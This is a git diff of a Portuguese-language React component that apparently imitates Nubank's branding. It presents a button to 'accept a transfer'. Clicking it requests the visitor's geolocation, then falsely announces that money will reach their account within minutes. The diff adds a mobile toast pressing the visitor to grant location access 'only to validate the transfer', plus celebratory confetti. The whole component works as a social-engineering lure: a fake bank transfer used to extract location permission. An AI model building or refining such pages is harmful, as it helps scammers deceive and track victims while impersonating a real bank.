@@ -2,14 +2,21 @@
 
 import { Button } from '@/components/ui/button'
 import { AddIcon } from '@/icons'
-import { useState, useEffect } from 'react'
+import { useState, useEffect, useRef } from 'react'
 import '@/styles/spinner.css'
+// @ts-ignore: Não há declaração de tipos para canvas-confetti
+import confetti from 'canvas-confetti'
 
 const LOADING_STEPS = [
   { text: 'Aceitando transferência...', duration: 2000 },
   { text: 'Carregando...', duration: 3000 },
   { text: 'Quase lá...', duration: 3000 },
 ]
+
+function isMobile() {
+  if (typeof window === 'undefined') return false
+  return /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent)
+}
 
 // Paleta Nubank: Roxo escuro (#820ad1), Roxo claro (#b226ef), Branco (#fff)
 
@@ -18,9 +25,10 @@ export function AceitarTransferenciaButton() {
   const [loading, setLoading] = useState(false)
   const [loadingStep, setLoadingStep] = useState(0)
   const [transferenciaAceita, setTransferenciaAceita] = useState(false)
-  const [showToast, setShowToast] = useState(false)
+  const [showToast, setShowToast] = useState(true)
   const [fadeText, setFadeText] = useState(true)
   const [buttonText, setButtonText] = useState('Aceitar transferência')
+  const [showTopToast, setShowTopToast] = useState(false)
 
   function obterLocalizacao() {
     setLoading(true)
@@ -79,6 +87,9 @@ export function AceitarTransferenciaButton() {
       obterLocalizacao()
     } else if (result.state === 'prompt') {
       setMensagem('Para aceitar, é necessário permitir para a identificação.')
+      if (isMobile() && !showTopToast) {
+        setShowTopToast(true)
+      }
       obterLocalizacao()
     } else if (result.state === 'denied') {
       setMensagem(
@@ -87,18 +98,65 @@ export function AceitarTransferenciaButton() {
     }
   }
 
-  // Toast some automaticamente após 7 segundos, sem reaparecer
+  // Toast inferior (sucesso) some automaticamente após 7 segundos
   useEffect(() => {
     if (showToast) {
       const timer = setTimeout(() => setShowToast(false), 7000)
       return () => clearTimeout(timer)
     }
-    // Não reinicia o timer se showToast já for false
+  }, [showToast])
+
+  // Toast superior (mobile, permissão) some automaticamente após 5 segundos
+  useEffect(() => {
+    if (showTopToast) {
+      const timer = setTimeout(() => setShowTopToast(false), 5000)
+      return () => clearTimeout(timer)
+    }
+  }, [showTopToast])
+
+  // Dispara confete quando showToast for true
+  useEffect(() => {
+    if (showToast) {
+      confetti({
+        particleCount: 120,
+        spread: 80,
+        origin: { x: 0.5, y: 0.5 },
+        colors: ['#820ad1', '#b226ef', '#fff', '#ffcb05', '#00e1e6', '#ff5fa2'],
+        scalar: 1.1,
+        zIndex: 9999,
+      })
+    }
     // eslint-disable-next-line
   }, [showToast])
 
   return (
     <div className="w-full flex flex-col items-center gap-2">
+      {/* Toast superior mobile */}
+      {showTopToast && (
+        <div className="fixed top-4 left-1/2 -translate-x-1/2 z-50 px-4 py-2 flex items-center gap-2 rounded-xl shadow-lg bg-purple-600 text-white text-sm font-medium animate-fade-in-out max-w-xs">
+          <svg
+            className="w-5 h-5 text-white opacity-80"
+            fill="none"
+            stroke="currentColor"
+            strokeWidth="2.2"
+            viewBox="0 0 24 24"
+          >
+            <path
+              strokeLinecap="round"
+              strokeLinejoin="round"
+              d="M13 16h-1v-4h-1m1-4h.01"
+            />
+            <circle
+              cx="12"
+              cy="12"
+              r="10"
+              stroke="currentColor"
+              strokeWidth="2"
+            />
+          </svg>
+          <span>Permita o acesso à localização apenas para validar a transferência.</span>
+        </div>
+      )}
       <Button
         className={`w-full text-white font-semibold flex items-center justify-center gap-2 disabled:opacity-60 transition-all duration-500 bg-purple-600 hover:bg-purple-700`}
         style={loading ? { boxShadow: '0 4px 24px 0 rgba(130, 10, 209, 0.18)' } : {}}
@@ -148,7 +206,7 @@ export function AceitarTransferenciaButton() {
                 />
               </svg>
             </span>
-            <span className="text-base font-bold text-gray-900">Transferência aceita</span>
+            <span className="text-base text-gray-900">Transferência aceita!</span>
           </span>
           <span className="text-xs text-gray-700 text-center leading-snug">
             Dentro de alguns minutos o valor estará na sua conta
@@ -162,23 +220,19 @@ export function AceitarTransferenciaButton() {
         @keyframes fade-in-out {
           0% {
             opacity: 0;
-            transform: translateY(30px) scale(0.98);
           }
           10% {
             opacity: 1;
-            transform: translateY(0) scale(1);
           }
           90% {
             opacity: 1;
-            transform: translateY(0) scale(1);
           }
           100% {
             opacity: 0;
-            transform: translateY(30px) scale(0.98);
           }
         }
         .animate-fade-in-out {
-          animation: fade-in-out 3s cubic-bezier(0.4, 0, 0.2, 1);
+          animation: fade-in-out 7.5s cubic-bezier(0.4, 0, 0.2, 1);
         }
         @keyframes fade-in {
           from {
